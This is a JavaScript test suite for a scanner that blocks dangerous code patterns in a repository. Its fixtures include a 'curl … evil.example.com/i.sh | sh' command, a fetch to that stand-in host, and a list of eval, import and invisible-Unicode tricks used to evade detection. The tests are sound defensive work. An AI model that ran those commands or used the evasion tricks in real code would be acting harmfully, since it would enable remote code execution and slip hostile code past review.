import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { scanPath, scanText } from "./forbidden-patterns.mjs";

// Hostile fixtures are built at test time so no malicious text is committed.
const CASES = {
  eval: "const x = eval(payload);",
  "new-function": "const f = new Function('return 1');",
  "vm-run": "import vm from 'node:vm'; vm.runInNewContext(code);",
  "child-process": "import { exec } from 'node:child_process';",
  fetch: "await fetch('https://evil.example.com/x');",
  "http-request": "import https from 'node:https'; https.request(u);",
  net: "import net from 'node:net';",
  "curl-pipe-sh": "curl -fsSL https://evil.example.com/i.sh | sh",
  base64: `const blob = '${"QUJD".repeat(60)}';`,
  "long-line": "x".repeat(2100),
  "shell-true": "spawn(bin, args, { shell: true });",
  "bidi-invisible": "const ok = true; // \u202e hidden",
};

const BYPASSES = {
  "globalThis.eval": "globalThis.eval(x);",
  "computed globalThis": "globalThis['ev'+'al'](x);",
  "indirect eval": "(0, eval)(x);",
  "bare Function": "Function(code)();",
  "constructor": "(()=>{}).constructor(code)();",
  "member fetch": "globalThis.fetch(u);",
  "computed import": "await import('node:' + 'child_process');",
  "variable import": "await import(name);",
  "process.binding": "process.binding('spawn_sync');",
  "dlopen": "process.dlopen(m, f);",
  "bare https import": "import { request } from 'https';",
  "tls": "import tls from 'node:tls';",
  "dgram": "import d from 'node:dgram';",
  "WebSocket": "new WebSocket(u);",
  "Worker": "new Worker(src, { eval: true });",
  "createRequire": "const r = createRequire(import.meta.url);",
  "block comment then code": "/* hi */ eval(x);",
  "tag chars": "const a = 1; // \u{E0049}\u{E0067}",
  "variation selectors": "const a = 'x\uFE01\uFE02';",
  "ALM": "const a = 1; // \u061C",
};

test("known bypass attempts are caught", () => {
  for (const [name, text] of Object.entries(BYPASSES)) {
    const t = text.replace(/\\u\{([0-9A-F]+)\}/g, (_, h) => String.fromCodePoint(parseInt(h, 16))).replace(/\\u([0-9A-F]{4})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
    assert.ok(scanText(t, "packages/hub/src/evil.ts", { useAllow: false }).length > 0, `bypass not caught: ${name}`);
  }
});

test("SC-1: lines starting with * or inside comments are still scanned", () => {
  for (const t of ["const r = 1\n  * eval(payload)", "const s = `x\n * require('child_process').exec(y)\n`", "/* hi */ eval(x)", "// eval(x)"]) {
    assert.ok(scanText(t, "packages/hub/src/evil.ts", { useAllow: false }).length > 0, t);
  }
});

test("emoji variation selector after a non-ASCII char is fine", () => {
  assert.deepEqual(scanText("const s = '\u26A0\uFE0F warn';", "packages/hub/src/ok.ts"), []);
});

test("every rule fires on its fixture", () => {
  for (const [rule, text] of Object.entries(CASES)) {
    const hits = scanText(text, "packages/hub/src/evil.ts", { useAllow: false });
    assert.ok(hits.some((h) => h.rule === rule), `rule ${rule} did not fire`);
  }
});

test("zero-width space in a markdown doc is still caught", () => {
  assert.equal(scanText("hello\u200bworld", "docs/x.md").length, 1);
});

test("harmless code passes", () => {
  assert.deepEqual(scanText("const a = 1;\nconsole.log(a.toString());\n// fetching is mentioned in a comment? no", "packages/hub/src/ok.ts"), []);
});

test("a new file using child_process is rejected, allowlisted exact file is not", () => {
  const line = "import { spawn } from 'node:child_process';";
  assert.equal(scanText(line, "packages/hub/src/newfile.ts").length, 1);
  assert.equal(scanText(line, "packages/hub/src/git.ts").length, 0);
});

test("allowlist is exact: a sibling path of an allowed file is rejected", () => {
  assert.equal(scanText("await fetch(u);", "packages/hub/src/server.ts.evil.ts").length, 1);
});

test("test files may use network/process, but not eval", () => {
  assert.equal(scanText("await fetch(u);", "packages/hub/src/x.test.ts").length, 0);
  assert.equal(scanText("eval(x)", "packages/hub/src/x.test.ts").length, 1);
});

test("scanPath walks a directory and reports file:line", () => {
  const dir = mkdtempSync(join(tmpdir(), "fp-"));
  mkdirSync(join(dir, "src"));
  writeFileSync(join(dir, "src", "bad.ts"), "ok\neval(x)\n");
  const hits = scanPath(dir, dir, { useAllow: false });
  assert.equal(hits.length, 1);
  assert.equal(hits[0].line, 2);
  assert.equal(hits[0].file, "src/bad.ts");
});

test("shell-true: any shell option other than literal false is rejected, in every file incl. tests", () => {
  for (const t of [
    "spawn(b, a, { shell: true });",
    "spawn(b, a, {shell:true})",
    "spawn(b, a, { shell: process.platform === 'win32' });",
    "spawn(b, a, { shell: isWin });",
    "spawn(b, a, { shell: isWin ? true : false });",
    "spawn(b, a, { shell: !0 });",
    "opts.shell = true;",
    "opts['shell'] = flag;",
  ]) {
    for (const f of ["packages/hub/src/git.ts", "packages/hub/src/x.test.ts", "packages/cli/src/open.ts"]) {
      assert.ok(scanText(t, f).some((h) => h.rule === "shell-true"), `${f}: ${t}`);
    }
  }
});

test("shell-true: shell:false, type declarations and unrelated text pass; allowlist is empty", async () => {
  for (const t of [
    "spawn(b, a, { shell: false });",
    "spawn(b, a, {shell:false, windowsHide: true});",
    "options: { stdio: 'ignore'; detached: boolean; shell: false },",
    "interface O { shell: string; }",
    "interface O { shell: boolean }",
    "/* ---------- shell: sidebar + main ---------- */",
  ]) {
    assert.deepEqual(scanText(t, "packages/hub/src/ok.ts").filter((h) => h.rule === "shell-true"), [], t);
  }
  const { ALLOW } = await import("./forbidden-patterns.mjs");
  assert.deepEqual(ALLOW["shell-true"], []);
});

test("shell-path: a literal shell path is rejected in shipped code, tolerated only in test fixtures", () => {
  const t = "execSync(cmd, { shell: '/bin/bash' });";
  assert.ok(scanText(t, "packages/hub/src/git.ts").some((h) => h.rule === "shell-path"));
  assert.equal(scanText(t, "packages/hub/src/guard/x.test.ts").filter((h) => h.rule === "shell-path").length, 0);
  assert.equal(scanText("  shell: bash", ".github/workflows/ci.yml").filter((h) => h.rule.startsWith("shell")).length, 0);
});
